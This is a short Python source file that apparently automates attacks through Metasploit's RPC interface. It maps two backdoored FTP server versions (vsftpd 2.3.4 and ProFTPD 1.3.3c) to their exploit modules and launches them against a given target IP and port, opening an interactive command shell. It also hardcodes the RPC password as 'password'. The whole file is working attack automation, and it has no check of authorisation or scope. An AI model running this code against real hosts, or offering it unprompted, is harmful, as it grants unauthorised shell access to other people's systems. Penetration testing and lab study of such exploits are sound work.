from pymetasploit3.msfrpc import MsfRpcClient

class MetasploitExecutor:
    def __init__(self, server='127.0.0.1', port=55553):
        self.client = MsfRpcClient('password', server=server, port=port, ssl=True)

    def exploit_service(self, target_ip, service, port):
        exploit_map = {
            'vsftpd-2.3.4': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'proftpd-1.3.3': 'exploit/unix/ftp/proftpd_133c_backdoor'
        }
        exploit = self.client.modules.use('exploit', exploit_map[service])
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = port
        return exploit.execute(payload='cmd/unix/interact')
